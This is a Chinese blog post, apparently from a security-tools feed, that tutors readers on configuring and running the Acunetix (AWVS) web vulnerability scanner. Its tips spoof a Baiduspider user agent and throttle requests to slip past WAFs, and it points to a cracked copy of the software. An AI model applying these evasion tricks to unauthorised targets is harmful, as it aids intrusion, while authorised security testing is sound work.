    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><p><img src="\images\pasted-58.png" alt="upload successful"></p><h1 id="AWVS介绍"><a href="#AWVS介绍" class="headerlink" title="AWVS介绍"></a>AWVS介绍</h1><p>Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的 Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流 行安全漏洞。 它包含有收费和免费两种版本，AWVS官方网站是： <a href="http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：" target="_blank" rel="noopener">http://www.acunetix.com/，目前最新版是V11版本，官方下载地址：</a> <a href="https://www.acunetix.com/vulnerability-scanner/download/，" target="_blank" rel="noopener">https://www.acunetix.com/vulnerability-scanner/download/，</a> 官方免费下载的是试用14天的版本。    吾爱破解网站上有完整的安装破解过程</p><h1 id="AWVS优点"><a href="#AWVS优点" class="headerlink" title="AWVS优点"></a>AWVS优点</h1><p>自动的客户端脚本分析器，允许对 Ajax 和 Web 2.0 应用程序进行安全性测 试。</p><p>业内最先进且深入的 SQL 注入和跨站脚本测试 </p><p>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer </p><p>可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域</p><p> 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制 </p><p>丰富的报告功能，包括 VISA PCI 依从性报告 </p><p>高速的多线程扫描器轻松检索成千上万个页面 i)、智能爬行程序检测 web 服务器类型和应用程序语言</p><p>Acunetix 检索并分析网站，包括 flash 内容、 SOAP 和 AJAX </p><p>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 l)、可导出网站漏洞文件    </p><h1 id="AWVS菜单栏"><a href="#AWVS菜单栏" class="headerlink" title="AWVS菜单栏"></a>AWVS菜单栏</h1><p><img src="\images\pasted-59.png" alt="upload successful"></p><h1 id="AWVS工具栏"><a href="#AWVS工具栏" class="headerlink" title="AWVS工具栏"></a>AWVS工具栏</h1><p><img src="\images\pasted-60.png" alt="upload successful"></p><p>从左到右分别是：</p><p>新建扫描——网站扫描——网站爬行——目标查找——目标探测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅探——HTTP Fuzzer——认证测试——结果对比——WSDL扫描——WSDL编辑测试——程序设置——扫描设置——侧重扫描设置——计划任务——报告</p><p>对于AWVS最常用的应该就是站点扫描了</p><h1 id="AWVS-新建扫描"><a href="#AWVS-新建扫描" class="headerlink" title="AWVS 新建扫描"></a>AWVS 新建扫描</h1><p>点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要<br>设定下面选项:<br>1). Scan type<br>2). Options<br>3). Target<br>4). Login<br>5). Finsh</p><h3 id="AWVS-新建扫描——Scan-type"><a href="#AWVS-新建扫描——Scan-type" class="headerlink" title="AWVS 新建扫描——Scan type"></a>AWVS 新建扫描——Scan type</h3><p><img src="\images\pasted-75.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Options"><a href="#AWVS-新建扫描——Options" class="headerlink" title="AWVS 新建扫描——Options"></a>AWVS 新建扫描——Options</h3><p><img src="\images\pasted-76.png" alt="upload successful"></p><h4 id="Options——Scanning-profile"><a href="#Options——Scanning-profile" class="headerlink" title="Options——Scanning profile"></a>Options——Scanning profile</h4><p>设置侧重扫描的类型，包含16种侧重检测类型</p><p><img src="\images\pasted-63.png" alt="upload successful"></p><h5 id="Scanning-Profiles-scripts"><a href="#Scanning-Profiles-scripts" class="headerlink" title="Scanning Profiles scripts"></a>Scanning Profiles scripts</h5><p><img src="\images\pasted-64.png" alt="upload successful"></p><h3 id="Options——Scan-Setting"><a href="#Options——Scan-Setting" class="headerlink" title="Options——Scan Setting"></a>Options——Scan Setting</h3><p><img src="\images\pasted-74.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Advanced"><a href="#AWVS-新建扫描——Advanced" class="headerlink" title="AWVS 新建扫描——Advanced"></a>AWVS 新建扫描——Advanced</h3><p><img src="\images\pasted-67.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Target"><a href="#AWVS-新建扫描——Target" class="headerlink" title="AWVS 新建扫描——Target"></a>AWVS 新建扫描——Target</h3><p><img src="\images\pasted-68.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Login"><a href="#AWVS-新建扫描——Login" class="headerlink" title="AWVS 新建扫描——Login"></a>AWVS 新建扫描——Login</h3><p><img src="\images\pasted-69.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——Finish"><a href="#AWVS-新建扫描——Finish" class="headerlink" title="AWVS 新建扫描——Finish"></a>AWVS 新建扫描——Finish</h3><p><img src="\images\pasted-70.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——结果（一）"><a href="#AWVS-新建扫描——结果（一）" class="headerlink" title="AWVS 新建扫描——结果（一）"></a>AWVS 新建扫描——结果（一）</h3><p><img src="\images\pasted-71.png" alt="upload successful"></p><p><img src="\images\pasted-77.png" alt="upload successful"><br>扫描的结果能看到发现漏洞所用的payload，对应的HTTP头信息、HTML、可发送到HTTP Editor中等</p><h3 id="AWVS-新建扫描——结果（二）"><a href="#AWVS-新建扫描——结果（二）" class="headerlink" title="AWVS 新建扫描——结果（二）"></a>AWVS 新建扫描——结果（二）</h3><p><img src="\images\pasted-72.png" alt="upload successful"></p><h3 id="AWVS-新建扫描——导出"><a href="#AWVS-新建扫描——导出" class="headerlink" title="AWVS 新建扫描——导出"></a>AWVS 新建扫描——导出</h3><p><img src="\images\pasted-73.png" alt="upload successful"></p><h1 id="AWVS扫描小技巧"><a href="#AWVS扫描小技巧" class="headerlink" title="AWVS扫描小技巧"></a>AWVS扫描小技巧</h1><h3 id="1-文件头加"><a href="#1-文件头加" class="headerlink" title="1.文件头加"></a>1.文件头加</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p>可以绕过狗，waf等<br>另外如果很容易把对方扫死的话，可以在第一项limit number…..，这里是最大的并发连接数默认是10，可以改低为2-5， 某些WAF对访问请求时间太快会进行拦截，可以进行延迟发包，在Delay between 默认是0，改为1-5</p><h3 id="2-设置cookie"><a href="#2-设置cookie" class="headerlink" title="2.设置cookie"></a>2.设置cookie</h3><p>表单验证用户某些页面，例如扫描后台、扫描用户登录后可访问的页面时候，需要登录用户密码验证再进行扫描，可以设置cookie 来解决</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
